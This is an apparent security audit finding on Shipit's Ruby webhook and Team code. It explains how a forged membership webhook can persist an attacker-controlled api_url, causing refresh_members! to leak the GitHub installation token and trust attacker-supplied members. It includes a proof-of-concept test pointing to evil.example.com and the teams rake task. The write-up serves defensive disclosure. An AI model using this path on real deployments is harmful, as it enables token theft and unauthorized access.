### Title
`Team#refresh_members!` trusts attacker-set `organization`/`api_url` forever when the Team row is first created via a forged `membership` webhook - (File: `app/models/shipit/team.rb`, `app/models/shipit/webhooks/handlers/membership_handler.rb`)

### Summary
`MembershipHandler#find_or_create_team!` only assigns `team.organization` and `team.api_url` (via `team.github_team=`) inside the `find_or_create_by!` block, which Rails executes only when the record is newly created. If an attacker's forged `membership` webhook is the first event to establish a `Team` row for a given `github_id`, both `organization` and `api_url` are persisted from fully attacker-controlled payload fields, and `refresh_members!` will use those poisoned values on every subsequent run, rather than self-healing.

### Finding Description
Binding under test: `team.organization == <organization that legitimately owns this GitHub team>` AND `team.api_url == <the real GitHub API URL for this team>`.

- `Team#refresh_members!` performs a full membership replace by querying `Shipit.github(organization: organization).api.get(api_url)`, then `self.members = members` [1](#0-0) .
- `MembershipHandler#find_or_create_team!` looks up the team by `github_id` only and, **only on the create branch**, sets `team.organization = params.organization.login` and (`via team.github_team=`) `team.api_url = github_team.url` [2](#0-1) [3](#0-2) . Both `params.organization.login` and `params.team.url` come straight from the attacker-controlled JSON body validated only for type (`String`), with no host/domain restriction [4](#0-3) .
- The `teams` table enforces uniqueness on `["organization", "slug"]`, **not** on `github_id` [5](#0-4) . So a webhook using a not-yet-persisted `github_id` combined with an `organization`/`slug` pair matching a real, not-yet-materialized Shipit-configured team (e.g. `Shipit.github_teams` entry that hasn't been fetched/created yet) will create the canonical row for that `organization/slug` handle, since `Team.find_or_create_by_handle` looks up by `organization`+`slug` [6](#0-5) .
- Once that row exists with `organization` set to a real, resolvable org (so `Shipit.github(organization:)` returns a valid, credentialed client) but `api_url` pointing to an attacker-controlled absolute URL, `refresh_members!` will use Shipit's own authenticated GitHub client to `GET` that attacker URL - leaking the `Authorization` header (the app's installation token) to the attacker's server, and then trusting whatever member list the attacker's server returns as the new membership set, via `self.members = members; save!` [1](#0-0) .
- Contrast with the case where the `Team` row already existed before the forged webhook (the "scenario 1" case): `find_or_create_by!`'s block does not run, `organization`/`api_url` stay as legitimately set, and the next `refresh_members!` fetches from the real org/API and purges the forged `Membership`, i.e. self-heals. This is corroborated by the existing test, which asserts `refresh_members!` calls `Shipit.github.api.get(@team.api_url)` using the team's already-stored `api_url` [7](#0-6) .
- `Shipit.github_teams` (the actual authorization source used elsewhere) is a memoized list built from configured handles at boot via `Team.find_or_create_by_handle` [8](#0-7) , and `lib/tasks/teams.rake` (`teams:fetch`) iterates that same list calling `refresh_members!` [9](#0-8)  - so a poisoned row that wins the `organization`/`slug` slot becomes the object operators keep refreshing.

Reaching this state still requires a valid webhook signature. `WebhooksController#verify_signature` selects the verifying `GithubApp` via `repository_owner`, which falls back to `params.dig('organization','login')` when no `repository` key is present [10](#0-9)  - real `membership` events have no `repository` key, so this fallback is always exercised for this event type, and it is fully attacker-selected within the same forged JSON body. `verify_webhook_signature` only returns `true` unconditionally when no `webhook_secret` is configured for the org resolved this way [11](#0-10) ; when a secret is configured, the attacker cannot forge a valid HMAC without it. This finding therefore inherits the precondition from the referenced "scenario 5" (a successful forged-create-path event) - it does not independently establish a signature bypass.

### Impact Explanation
If the precondition (attacker succeeds in getting the create-path executed for the target `organization`/`slug` handle before the real team row exists) holds, the consequences are: (1) exfiltration of Shipit's GitHub App/installation access token via SSRF on every `rake teams:fetch` run, matching "exfiltration of ... deploy-time secrets"; and (2) persistent, attacker-controlled membership of an OAuth-authorization-relevant `Team` (escalation into `Shipit.github_teams` authorization), since the attacker's own server dictates the "member list" `refresh_members!` trusts on every refresh cycle. This is repeatable indefinitely (every `teams:fetch` run) and is scoped to whichever `organization`/`slug` handle the attacker manages to claim first.

### Likelihood Explanation
The finding is entirely conditioned on the create-path precondition established in scenario 5 (attacker wins the race to create the `Team` row for a given `organization`/`slug` with a fresh `github_id`, which itself requires either an unconfigured `webhook_secret` for the resolved organization or another signature-bypass already assumed by the audit). Given that precondition, no further secrets or privileges are needed - `Team#api_url` has no format/host validation restricting it to `api.github.com`, so the attacker's URL is accepted verbatim.

### Recommendation
- Validate `api_url` against the expected GitHub API host (and ideally re-derive it from `organization`/`slug` rather than trusting the webhook payload) in `Team#github_team=`.
- Make `find_or_create_team!` re-verify/re-set `organization` (and `api_url`) to the value derived from `Shipit.github_teams` config or from a fresh, freshly-fetched GitHub team lookup rather than blindly trusting webhook-provided fields on create.
- Add a unique index on `teams.github_id` and reconcile/reject creation when `github_id` collides with a different `organization`/`slug`.

### Proof of Concept
```ruby
# test/models/team_test.rb (illustrative additions)
test "refresh_members! uses organization/api_url set at creation time via forged membership create-path" do
  # Simulate MembershipHandler#find_or_create_team! creating a brand-new Team
  # from attacker-controlled payload where github_id was not previously known.
  team = Shipit::Team.find_or_create_by!(github_id: 999_999) do |t|
    t.github_team = stub(name: 'Fake', slug: 'fake', url: 'https://evil.example.com/members', id: 999_999)
    t.organization = 'shopify' # legitimate, resolvable org name
  end

  assert_equal 'shopify', team.organization
  assert_equal 'https://evil.example.com/members', team.api_url

  # refresh_members! now queries the attacker's URL using Shipit's own
  # credentialed client for 'shopify', not the legitimate team endpoint.
  Shipit.github(organization: 'shopify').api.expects(:get).with('https://evil.example.com/members')
    .returns(stub(rels: { members: stub(get: stub(data: [], rels: {})) }))

  team.refresh_members!
end
```

# frozen_string_literal: true

namespace :teams do
  desc "Import the members of each team configured through the github.oauth.teams config"
  task fetch: :environment do
    Shipit.github_teams.each do |team|
      puts "Fetching @#{team.handle} members"
      begin
        team.refresh_members!
      rescue Octokit::Unauthorized, Octokit::NotFound => e
        puts "Failed to fetch @#{team.handle} members. Do you have enough permissions?"
        puts "#{e.class}: #{e.message}"
      end
    end
  end
end
